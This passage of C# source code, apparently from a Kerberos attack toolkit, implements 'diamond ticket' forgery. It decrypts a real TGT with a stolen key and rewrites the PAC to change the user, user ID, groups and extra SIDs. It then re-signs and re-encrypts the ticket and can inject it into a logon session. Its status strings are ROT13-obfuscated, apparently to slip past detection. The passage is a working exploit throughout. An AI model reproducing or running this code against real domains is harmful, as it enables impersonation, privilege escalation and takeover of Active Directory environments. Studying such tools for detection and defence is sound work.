                    svrEncType = new string("nrf128".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                }
                else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
                {
                    svrEncType = new string("nrf256".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                }
                cmdOut = String.Format("{0} /{1}:{2}", cmdOut, svrEncType, Helpers.ByteArrayToString(serviceKey));

                cmdOut = String.Format("{0} /user:{1} /id:{2} /pgid:{3} /domain:{4} /sid:{5}", cmdOut, user, kvi.UserId, kvi.PrimaryGroupId, domain, kvi.LogonDomainId.GetValue());
                try
                {
                    cmdOut = String.Format("{0} /logofftime:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.LogoffTime.LowDateTime | ((long)kvi.LogoffTime.HighDateTime << 32)).ToLocalTime());
                }
                catch { }
                try
                {
                    cmdOut = String.Format("{0} /pwdlastset:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime());
                }
                catch { }
                if (minPassAge != null && minPassAge > 0)
                {
                    cmdOut = String.Format("{0} /minpassage:{1}", cmdOut, minPassAge);
                }
                if (maxPassAge != null && maxPassAge > 0)
                {
                    cmdOut = String.Format("{0} /maxpassage:{1}", cmdOut, maxPassAge);
                }
                if (kvi.BadPasswordCount > 0)
                {
                    cmdOut = String.Format("{0} /badpwdcount:{1}", cmdOut, kvi.BadPasswordCount);
                }
                if (kvi.LogonCount > 0)
                {
                    cmdOut = String.Format("{0} /logoncount:{1}", cmdOut, kvi.LogonCount);
                }
                if (!String.IsNullOrEmpty(kvi.FullName.ToString()))
                {
                    cmdOut = String.Format("{0} /displayname:\"{1}\"", cmdOut, kvi.FullName.ToString());
                }
                if (!String.IsNullOrEmpty(kvi.LogonScript.ToString()))
                {
                    cmdOut = String.Format("{0} /scriptpath:\"{1}\"", cmdOut, kvi.LogonScript.ToString());
                }
                if (!String.IsNullOrEmpty(kvi.ProfilePath.ToString()))
                {
                    cmdOut = String.Format("{0} /profilepath:\"{1}\"", cmdOut, kvi.ProfilePath.ToString());
                }
                if (!String.IsNullOrEmpty(kvi.HomeDirectory.ToString()))
                {
                    cmdOut = String.Format("{0} /homedir:\"{1}\"", cmdOut, kvi.HomeDirectory.ToString());
                }
                if (!String.IsNullOrEmpty(kvi.HomeDirectoryDrive.ToString()))
                {
                    cmdOut = String.Format("{0} /homedrive:\"{1}\"", cmdOut, kvi.HomeDirectoryDrive.ToString());
                }
                if (!String.IsNullOrEmpty(kvi.LogonDomainName.ToString()))
                {
                    cmdOut = String.Format("{0} /netbios:{1}", cmdOut, kvi.LogonDomainName.ToString());
                }
                if (kvi.GroupCount > 0)
                {
                    cmdOut = String.Format("{0} /groups:{1}", cmdOut, kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
                }
                if (kvi.SidCount > 0)
                {
                    cmdOut = String.Format("{0} /sids:{1}", cmdOut, kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
                }
                if (kvi.ResourceGroupCount > 0)
                {
                    cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
                }
                if (!String.IsNullOrEmpty(kvi.LogonServer.ToString()))
                {
                    cmdOut = String.Format("{0} /dc:{1}.{2}", cmdOut, kvi.LogonServer.ToString(), domain);
                }
                if ((Interop.PacUserAccountControl)kvi.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                {
                    cmdOut = String.Format("{0} /uac:{1}", cmdOut, String.Format("{0}", (Interop.PacUserAccountControl)kvi.UserAccountControl).Replace(" ", ""));
                }
                if (!user.Equals(cName))
                {
                    cmdOut = String.Format("{0} /cname:{1}", cmdOut, cName);
                }
                if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
                {
                    cmdOut = String.Format("{0} /s4uproxytarget:{1} /s4utransitiedservices:{2}", cmdOut, s4uProxyTarget, s4uTransitedServices);
                }
                if (includeAuthData)
                {
                    cmdOut = String.Format("{0} /authdata", cmdOut);
                }

                Console.WriteLine("\r\n[*] Printing a command to recreate a ticket containing the information used within this ticket\r\n\r\n{0}\r\n", cmdOut);
            }
        }

        public static byte[] DiamondTicket(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
        {
            byte[] tgtBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, luid, false, true);
            
            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
        }

        public static byte[] DiamondTicket(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), string krbKey = "", string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
        {
            byte[] tgtBytes = Ask.TGT(userName, domain, certFile, certPass, etype, null, false, domainController);
            
            return ModifyTicket(new KRB_CRED(tgtBytes), krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
        }

        public static byte[] ModifyTicket(KRB_CRED kirbi, string serviceKey, string krbKey = "", string outfile = "", bool ptt = false, LUID luid = new LUID(), string ticketUser = "", string groups = "", int ticketUserId = 0, string sids = "")
        {
            Console.WriteLine();
            if (String.IsNullOrEmpty(krbKey))
            {
                krbKey = serviceKey;
            }

            EncTicketPart decryptedEncTicket = null;
            PACTYPE pt = null;
            Ticket ticket = null;
            try
            {
                ticket = kirbi.tickets[0];
                Console.WriteLine(new string("[*] Qrpelcgvat GTG".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                decryptedEncTicket = ticket.Decrypt(Helpers.StringToByteArray(serviceKey), null);
                Console.WriteLine(new string("[*] Ergervivat CNP".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                pt = decryptedEncTicket.GetPac(null);
            }
            catch
            {
                Console.WriteLine(new string("[K] Hanoyr gb qrpelcg gvpxrg be trg CNP!".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return null;
            }

            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
            ClientName cn = null;
            UpnDns upnDns = null;
            Attributes attrib = null;
            Requestor requestor = null;
            SignatureData svrSigData = null;
            SignatureData kdcSigData = null;

            Console.WriteLine(new string("[*] Zbqvslvat CNP".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            foreach (var pacInfoBuffer in pt.PacInfoBuffers)
            {
                if (pacInfoBuffer is LogonInfo linfo)
                {
                    kvi = linfo.KerbValidationInfo;

                    if (!String.IsNullOrEmpty(ticketUser))
                    {
                        kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(ticketUser);
                    }

                    if (!String.IsNullOrEmpty(groups))
                    {
                        int groupCount = groups.Split(',').Length;
                        kvi.GroupCount = groupCount;
                        kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[groupCount];

                        int c = 0;
                        foreach (string gid in groups.Split(','))
                        {
                            Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(Int32.Parse(gid), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
                            c += 1;
                        }
                    }
                    if (ticketUserId > 0)
                    {
                        kvi.UserId = ticketUserId;
                    }

                    if (!String.IsNullOrEmpty(sids))
                    {
                        int numOfSids = sids.Split(',').Length;
                        kvi.SidCount = numOfSids;
                        kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
                        int c = 0;
                        foreach (string s in sids.Split(','))
                        {
                            Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ExtraSids, c, 1);
                            c += 1;
                        }
                    }
                }
                else if (pacInfoBuffer is ClientName temp)
                {
                    cn = temp;
                    if (!String.IsNullOrEmpty(ticketUser))
                    {
                        cn = new ClientName(cn.ClientId,ticketUser);
                    }
                }
                else if (pacInfoBuffer is UpnDns temp2)
                {
                    upnDns = temp2;
                    if (!String.IsNullOrEmpty(ticketUser))
                    {
                        string samName = null;
                        SecurityIdentifier sid = null;
                        if (upnDns.Flags.HasFlag(Interop.UpnDnsFlags.EXTENDED))
                        {
                            samName = upnDns.SamName;
                            if (!string.IsNullOrWhiteSpace(ticketUser))
                            {
                                samName = ticketUser;
                            }
                            sid = upnDns.Sid;
                            if (ticketUserId > 0)
                            {
                                sid = new SecurityIdentifier(String.Format("{0}-{1}", sid.Value.Substring(0, sid.Value.LastIndexOf('-')), ticketUserId));
                            }
                        }
                        upnDns = new UpnDns((int)upnDns.Flags,upnDns.DnsDomainName,string.Format("{0}@{1}", ticketUser, upnDns.DnsDomainName.ToLower()), samName, sid);

                    }
                }
                else if (pacInfoBuffer is Attributes temp3)
                {
                    attrib = temp3;
                }
                else if (pacInfoBuffer is Requestor temp4)
                {
                    requestor = temp4;
                    if (ticketUserId > 0)
                    {
                        requestor = new Requestor(String.Format("{0}-{1}", requestor.RequestorSID.Value.Substring(0,requestor.RequestorSID.Value.LastIndexOf('-')), ticketUserId));
                    }
                }
                else if (pacInfoBuffer is SignatureData sigData)
                {
                    if (sigData.Type == PacInfoBufferType.KDCChecksum)
                    {
                        kdcSigData = sigData;
                    }
                    else if(sigData.Type == PacInfoBufferType.ServerChecksum)
                    {
                        svrSigData = sigData;
                    }
                }
            }
            int svrSigLength = 12;
            int kdcSigLength = 12;
            if (svrSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
                svrSigLength = 16;
            if (kdcSigData.SignatureType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5)
                kdcSigLength = 16;
            Console.WriteLine(new string("[*] Fvtavat CNP".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            svrSigData.Signature = new byte[svrSigLength];
            kdcSigData.Signature = new byte[kdcSigLength];
            Array.Clear(svrSigData.Signature, 0, svrSigLength);
            Array.Clear(kdcSigData.Signature, 0, kdcSigLength);

            List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
            LogonInfo li = new LogonInfo(kvi);
            PacInfoBuffers.Add(li);
            if (cn != null)
            {
                PacInfoBuffers.Add(cn);
            }
            if (upnDns != null)
            {
                PacInfoBuffers.Add(upnDns);
            }
            if (attrib != null)
            {
                PacInfoBuffers.Add(attrib);              
            }
            if (requestor != null)
            {
                PacInfoBuffers.Add(requestor);
            }
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            PACTYPE newPT = new PACTYPE(0, PacInfoBuffers);
            byte[] ptBytes = newPT.Encode();
            byte[] svrSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(serviceKey), ptBytes, svrSigData.SignatureType);
            byte[] kdcSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(krbKey), svrSig, kdcSigData.SignatureType);
            svrSigData.Signature = svrSig;
            kdcSigData.Signature = kdcSig;
            PacInfoBuffers = new List<PacInfoBuffer>();
            PacInfoBuffers.Add(li);
            if (cn != null)
            {
                PacInfoBuffers.Add(cn);
            }
            if (upnDns != null)
            {
                PacInfoBuffers.Add(upnDns);
            }
            if (attrib != null)
            {
                PacInfoBuffers.Add(attrib);
            }
            if (requestor != null)
            {
                PacInfoBuffers.Add(requestor);
            }
            PacInfoBuffers.Add(svrSigData);
            PacInfoBuffers.Add(kdcSigData);
            newPT = new PACTYPE(0, PacInfoBuffers);

            if (!string.IsNullOrEmpty(ticketUser))
            {
                decryptedEncTicket.cname = new PrincipalName(ticketUser);
                kirbi.enc_part.ticket_info[0].pname = new PrincipalName(ticketUser);
            }

            decryptedEncTicket.SetPac(newPT);
            Console.WriteLine(new string("[*] Rapelcgvat Zbqvsvrq GTG".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, Helpers.StringToByteArray(serviceKey), decryptedEncTicket.Encode().Encode());
            EncryptedData enc_part = new EncryptedData(ticket.enc_part.etype, encTicketPart, 3);
            ticket.enc_part = enc_part;
            kirbi.tickets[0] = ticket;

            byte[] kirbiBytes = kirbi.Encode().Encode();

            string kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine("");

            Console.WriteLine(new string("[*] onfr64(gvpxrg.xveov):\\e\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            if (Program.wrapTickets)
            {
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else
            {
                Console.WriteLine("      {0}", kirbiString);
            }

            Console.WriteLine("");

            if (!String.IsNullOrEmpty(outfile))
            {
                KrbCredInfo info = kirbi.enc_part.ticket_info[0];
                DateTime fileTime = (DateTime)info.starttime;
                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                filename = Helpers.MakeValidFileName(filename);
                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                {
                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                }
            }

            Console.WriteLine("");

            if (ptt || ((ulong)luid != 0))
            {
                LSA.ImportTicket(kirbiBytes, luid);
            }

            return kirbiBytes;
        }
    }
}